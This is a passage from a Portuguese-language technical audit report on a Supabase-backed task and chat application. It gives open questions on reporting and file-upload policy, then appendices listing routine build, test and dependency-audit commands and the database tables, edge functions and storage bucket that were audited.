3. **Estratégia dos Relatórios Executivos:** Devemos prosseguir com a ativação da chamada da procedure `get_board_report_metrics` no front-end (garantindo que 100% da base seja calculada com performance no banco), ou há planos de manter paginação infinita de tarefas no front-end?
4. **Armazenamento de Arquivos no Chat:** O bucket `chat-private` deve aceitar uploads apenas de imagens e documentos (PDF, planilhas, docs) ou há necessidade operacional de envio de arquivos compactados (.zip) ou executáveis?

---

## 9. Anexos Técnicos

### Anexo A: Comandos de Diagnóstico Executados
```powershell
# 1. Execução de testes de regressão
npm test
# Resultado: 20 passed, 224 passed, duração 2.14s

# 2. Compilação estrita TypeScript e bundle Vite
npm run build
# Resultado: tsc -b && vite build concluídos com sucesso (código de saída 0)

# 3. Auditoria de vulnerabilidades em dependências
npm audit
# Resultado: found 0 vulnerabilities

# 4. Verificação de pacotes desatualizados
npm outdated
# Resultado: @types/node, lucide-react, typescript e vite com versões mais recentes disponíveis
```

### Anexo B: Relação de Tabelas Auditadas
1. `public.profiles`
2. `public.teams`
3. `public.team_members`
4. `public.clients`
5. `public.stages`
6. `public.stage_transitions`
7. `public.subtask_templates`
8. `public.tasks`
9. `public.task_checklist`
10. `public.task_comments`
11. `public.task_movements`
12. `public.channels`
13. `public.messages`
14. `public.message_reads`
15. `public.attachments`
16. `public.checklist_template_groups`
17. `public.checklist_template_items`
18. `public.tags`
19. `public.boards`
20. `public.board_stages`
21. `public.sprints`
22. `public.client_registration_links`
23. `public.client_registration_submissions`
24. `public.task_lineage_events`

### Anexo C: Edge Functions Auditadas
1. `supabase/functions/invite-user/index.ts`
2. `supabase/functions/manage-user/index.ts`

### Anexo D: Buckets de Storage Auditados
1. `chat-private` (Privado, tamanho máximo 10MB)
